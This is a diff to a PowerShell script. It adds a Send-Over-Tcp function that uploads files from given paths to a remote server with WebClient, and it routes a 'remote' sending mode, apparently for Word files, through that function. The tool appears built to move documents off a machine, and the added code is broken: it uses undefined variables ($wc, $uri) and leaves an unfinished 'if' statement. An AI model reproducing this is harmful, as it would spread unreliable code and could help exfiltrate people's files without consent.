@@ -18,6 +18,23 @@ function Send-Over-Smb {
         Write-Host "No access to folder"
     }
 }
+
+function Send-Over-Tcp {
+    param (
+        [string[]]$Paths =@(),
+        [string]$Destination
+    )
+    $webclient = New-Object System.Net.WebClient
+    Foreach ($path in $Paths){
+        if (Test-Path -Path $path){
+            $resp = $wc.UploadFile($uri,$path)
+            if $resp.
+        }
+        
+    }
+
+}
+
 function Send-Data{
     param (
         [string]$Protocol = $CommunicationMethod,
@@ -29,7 +46,8 @@ function Send-Data{
              Send-Over-Smb -Paths $Paths -Destination $Destination
         }
         remote{
-            Send-Log -LogString "sending remote bla bla"
+            Send-Log -LogString "Sending To remote server"
+            Send-Over-Tcp -Paths $Paths -Destination $Destination
         }
         Default {
             Send-Log -LogString "Seems like your Sender flag is wrong... cant send word files"
